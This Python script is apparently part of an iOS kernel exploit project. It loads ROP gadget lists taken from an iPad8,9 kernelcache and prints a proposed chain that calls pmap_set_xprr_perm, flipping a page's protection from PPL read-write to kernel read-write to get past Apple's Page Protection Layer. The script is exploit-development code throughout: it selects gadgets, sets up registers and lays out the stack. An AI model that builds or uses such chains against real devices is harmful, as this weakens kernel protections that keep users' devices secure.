import json

# Load gadget data
rop = json.load(open(r'C:\Users\smolk\Documents\2\lara-main\iPad8,9_Analysis\21D61\rop_gadgets.json'))
rop_x8 = json.load(open(r'C:\Users\smolk\Documents\2\lara-main\iPad8,9_Analysis\21D61\rop_gadgets_x8.json'))

ldp_x0_x1 = rop['gadgets']['ldp_x0_x1_sp']
ldp_x2_x3 = rop['gadgets']['ldp_x2_x3_sp']
ldr_x8 = rop_x8['ldr_x8_sp']
blr_x8 = [g for g in rop['gadgets']['blr'] if g['reg'] == 8]

print('=== ROP Chain Strategy ===')
print('')
print('Goal: Call pmap_set_xprr_perm(pai, expected_perm, new_perm)')
print('  x0 = pai')
print('  x1 = expected_perm (XPRR_PPL_RW_PERM = 3)')
print('  x2 = new_perm (XPRR_KERN_RW_PERM = 1)')
print('  x8 = function address')
print('  then blr x8')
print('')
print('=== Available Gadgets ===')
print('')
print('ldp x0, x1, [sp], #16 (top 3):')
for g in ldp_x0_x1[:3]:
    print('  VM 0x%x (fileoff 0x%x) imm=%d' % (g['addr'], g['fileoff'], g['imm']))

print('')
print('ldp x2, x3, [sp], #16 (top 3):')
for g in ldp_x2_x3[:3]:
    print('  VM 0x%x (fileoff 0x%x) imm=%d' % (g['addr'], g['fileoff'], g['imm']))

print('')
print('ldr x8, [sp, #imm] (top 5 with small imm):')
small_imm = sorted(ldr_x8, key=lambda g: g['imm'])[:5]
for g in small_imm:
    print('  VM 0x%x (fileoff 0x%x) imm=%d' % (g['addr'], g['fileoff'], g['imm']))

print('')
print('blr x8 (top 3):')
for g in blr_x8[:3]:
    print('  VM 0x%x (fileoff 0x%x)' % (g['addr'], g['fileoff']))

print('')
print('=== Proposed ROP Chain ===')
print('')

# Pick best gadgets
g1 = ldp_x0_x1[0]  # ldp x0, x1, [sp], #16; ret
g2 = ldp_x2_x3[0]  # ldp x2, x3, [sp], #16; ret
g_x8 = small_imm[0]  # ldr x8, [sp, #imm]; ...
g_blr = blr_x8[0]  # blr x8

print('Stack layout:')
print('')
print('[sp + 0x00] = pai (physical page index)')
print('[sp + 0x08] = expected_perm (3 = XPRR_PPL_RW_PERM)')
print('[sp + 0x10] = address of gadget 2 (ldp x2, x3)')
print('[sp + 0x18] = new_perm (1 = XPRR_KERN_RW_PERM)')
print('[sp + 0x20] = next gadget address (ldr x8)')
print('[sp + 0x28] = padding (for ldr x8 imm offset)')
print('[sp + 0x30] = pmap_set_xprr_perm address')
print('[sp + 0x38] = blr x8 address')
print('')
print('Gadget addresses:')
print('  Gadget 1 (ldp x0, x1): 0x%x' % g1['addr'])
print('  Gadget 2 (ldp x2, x3): 0x%x' % g2['addr'])
print('  Gadget 3 (ldr x8):     0x%x (imm=%d)' % (g_x8['addr'], g_x8['imm']))
print('  Gadget 4 (blr x8):     0x%x' % g_blr['addr'])
print('')
print('Note: This chain sets up x0-x2 and x8, then calls blr x8')
print('The function pmap_set_xprr_perm will change XPRR permissions for the page')
